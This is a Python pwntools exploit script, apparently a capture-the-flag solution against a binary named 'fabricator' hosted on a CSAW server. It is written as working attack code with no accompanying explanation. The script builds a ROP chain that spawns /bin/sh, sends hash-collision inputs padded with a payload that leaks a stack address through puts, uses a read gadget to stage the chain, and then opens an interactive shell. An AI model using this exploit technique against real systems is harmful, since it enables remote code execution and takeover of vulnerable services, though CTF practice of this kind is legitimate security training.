from pwn import *

e = ELF("./fabricator")

from struct import pack

# Padding goes here
p = ''

p += pack('<Q', 0x00000000004010dc) # pop rsi ; ret
p += pack('<Q', 0x00000000006c10e0) # @ .data
p += pack('<Q', 0x000000000041c0c4) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x0000000000485ff1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004010dc) # pop rsi ; ret
p += pack('<Q', 0x00000000006c10e8) # @ .data + 8
p += pack('<Q', 0x000000000044b620) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000485ff1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004006c6) # pop rdi ; ret
p += pack('<Q', 0x00000000006c10e0) # @ .data
p += pack('<Q', 0x00000000004010dc) # pop rsi ; ret
p += pack('<Q', 0x00000000006c10e8) # @ .data + 8
p += pack('<Q', 0x00000000004502e5) # pop rdx ; ret
p += pack('<Q', 0x00000000006c10e8) # @ .data + 8
p += pack('<Q', 0x000000000044b620) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b480) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047ba25) # syscall ; ret


goal = p

prdi =  0x004006c6  
pay = p64(prdi) + p64(e.symbols["__environ"]) + p64(e.symbols["puts"]) + p64(e.symbols["runGame"])

#p = process(e.path)
p = remote('web.red.csaw.io', 5012)

c1 = open('collision1.bin', mode='rb').read().ljust(0x118) + pay
c2 = open('collision2.bin', mode='rb').read().ljust(0x118) + pay

p.recvuntil('>')
p.sendline(c1)
p.recvuntil('>')
p.sendline(c2)

p.recvuntil("day.")
p.recvline()

leak = u64(p.recvline(keepends=False).ljust(8, "\x00"))
print(hex(leak))

prsi = 0x0040a2e8 
prdx =   0x004b67d2  
pay = p64(prdi) + p64(0) + p64(prsi) + p64(leak - 0x100 + 0x10) + p64(0) + p64(prdx) + p64(0x10000) + p64(e.symbols["read"])

c1 = open('collision1.bin', mode='rb').read().ljust(0x118) + pay
c2 = open('collision2.bin', mode='rb').read().ljust(0x118) + pay

p.recvuntil('>')
p.sendline(c1)
p.recvuntil('>')
p.sendline(c2)

ui.pause()
p.sendline(goal)

p.interactive()
